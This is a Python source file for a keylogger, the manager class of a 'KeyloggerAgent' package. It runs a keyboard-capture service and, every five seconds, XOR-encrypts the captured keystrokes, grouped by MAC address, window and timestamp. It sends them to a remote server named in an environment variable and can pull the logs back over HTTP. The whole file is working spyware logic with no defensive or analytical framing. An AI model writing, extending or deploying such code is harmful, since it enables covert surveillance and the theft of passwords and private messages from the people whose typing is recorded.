import time
from KeyloggerAgent.Write import IWriter, FileWriter , NetworkWriter
from KeyloggerAgent.KeyloggerService import KeyLoggerService
from KeyloggerAgent.Encryption import XOREncryption
from dotenv import load_dotenv
import os
import requests

load_dotenv()
password = os.environ.get('PASSWORD')
server_name = os.environ.get('SERVER_NAME')


class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()
        self.writer = NetworkWriter()
        self.__encryption = XOREncryption(password)

    def start_listening(self):
        """
        Starts listening and sends the values
        to be written to a json file or to a network
        """
        self.service.start_listening()
        print("Keylogger is starting!")
        while True:
            time.sleep(5)
            data = self.service.get_data()
            self._writer(self.writer , self.encrypt(data),server_name)

    def stop_listening(self):
        """
         Stops listening to keyboard keys
        """
        self.service.stop_listening()

    def encrypt(self , data: dict) -> dict:
        """
        Takes an unencrypted dictionary
         and returns an encrypted dictionary
        """
        temp_dict = dict()
        for mac , user_dict in data.items():
            temp_dict[mac] = dict()
            for  window, data_dict in user_dict.items():
                temp_dict[mac][window] = dict()
                for timestamp ,data_keys in data_dict.items():
                     temp_dict[mac][window][timestamp]= self.__encryption.encrypt(data_keys)
        return temp_dict


    def decrypt(self):
        """
        Takes an encrypted json file
         and returns an unencrypted dictionary
        """
        if self.writer is FileWriter:
            temp_dict = dict()
            data = self.writer.load('log.json')
            for mac, user_dict in data.items():
                temp_dict[mac] = dict()
                for window, data_dict in user_dict.items():
                    temp_dict[mac][window] = dict()
                    for timestamp, data_keys in data_dict.items():
                        temp_dict[mac][window][timestamp] = self.__encryption.decrypt(data_keys)
            return temp_dict
        else:
            return requests.get(f"http://{server_name}/api/get_data")

    @staticmethod
    def _writer(write:IWriter, data:dict, name:str):
        """
        Writes text to a json file or to a network
        """
        write.write(data , name)

if __name__ == "__main__":
    keylogger = KeyLoggerManager()
    keylogger.start_listening()



